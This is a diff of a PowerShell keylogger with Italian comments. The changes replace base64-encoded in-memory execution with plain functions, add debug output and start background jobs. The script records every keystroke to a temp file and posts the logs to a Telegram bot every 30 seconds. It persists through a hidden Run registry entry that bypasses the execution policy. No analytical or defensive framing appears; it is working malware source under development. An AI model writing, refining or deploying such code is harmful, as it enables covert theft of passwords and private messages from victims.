@@ -6,13 +6,18 @@ $apiURL = "https://api.telegram.org/bot$botToken/sendMessage"
 # Percorso del file temporaneo per salvare i log
 $tempFile = "$env:TEMP\keylogs.txt"
 
-# Crea il file temporaneo se non esiste
+# Creazione del file temporaneo
 if (-Not (Test-Path $tempFile)) {
+    Write-Host "Creazione del file temporaneo: $tempFile"
     New-Item -Path $tempFile -ItemType File -Force | Out-Null
+} else {
+    Write-Host "File temporaneo già esistente: $tempFile"
 }
 
 # Funzione per catturare i tasti premuti
-$encodedKeylogger = {
+function Start-Keylogger {
+    Write-Host "Start-Keylogger avviato"
+
     Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -34,47 +39,56 @@ public class KeyboardTracker {
     }
 }
 "@
+    Write-Host "Add-Type completato"
 
     while ($true) {
-        Start-Sleep -Milliseconds 100
+        Start-Sleep -Milliseconds 100  # Intervallo per ridurre il carico della CPU
         try {
             $keys = [KeyboardTracker]::LogKeys()
             if ($keys -ne "") {
                 Add-Content -Path $tempFile -Value $keys
+                Write-Host "Tasti registrati: $keys"
             }
         } catch {
+            Write-Host "Errore nella registrazione dei tasti: $_"
             Start-Sleep -Seconds 5
         }
     }
-} | Out-String | [System.Text.Encoding]::Unicode.GetBytes | [Convert]::ToBase64String
+}
 
 # Funzione per inviare i log a Telegram
-$encodedSendLogs = {
+function Send-Logs {
+    Write-Host "Send-Logs avviato"
     while ($true) {
         Start-Sleep -Seconds 30
         try {
             if (Test-Path $tempFile) {
                 $logs = Get-Content -Path $tempFile -Raw
-                $body = @{
-                    chat_id = $chatId
-                    text = $logs
-                }
-                $response = Invoke-WebRequest -Uri $apiURL -Method POST -Body $body -ContentType "application/x-www-form-urlencoded"
-                if ($response.StatusCode -eq 200) {
-                    Clear-Content -Path $tempFile
+                if ($logs -ne "") {
+                    $body = @{
+                        chat_id = $chatId
+                        text = $logs
+                    }
+                    $response = Invoke-WebRequest -Uri $apiURL -Method POST -Body $body -ContentType "application/x-www-form-urlencoded"
+                    if ($response.StatusCode -eq 200) {
+                        Write-Host "Log inviato con successo a Telegram"
+                        Clear-Content -Path $tempFile
+                    }
                 }
             }
         } catch {
+            Write-Host "Errore durante l'invio a Telegram: $_"
             Start-Sleep -Seconds 10
         }
     }
-} | Out-String | [System.Text.Encoding]::Unicode.GetBytes | [Convert]::ToBase64String
+}
 
-# Decodifica ed esegui in memoria
-Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedKeylogger)))
-Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedSendLogs)))
-
-# Persistenza: aggiungi al registro di avvio
+# Persistenza: aggiungi il keylogger al registro di avvio
 if (-Not (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Keylogger")) {
+    Write-Host "Aggiunta del keylogger al registro di avvio"
     New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Keylogger" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $PSCommandPath" | Out-Null
 }
+
+# Avvia il keylogger e l'invio dei log in background
+Start-Job -ScriptBlock { Start-Keylogger }
+Start-Job -ScriptBlock { Send-Logs }
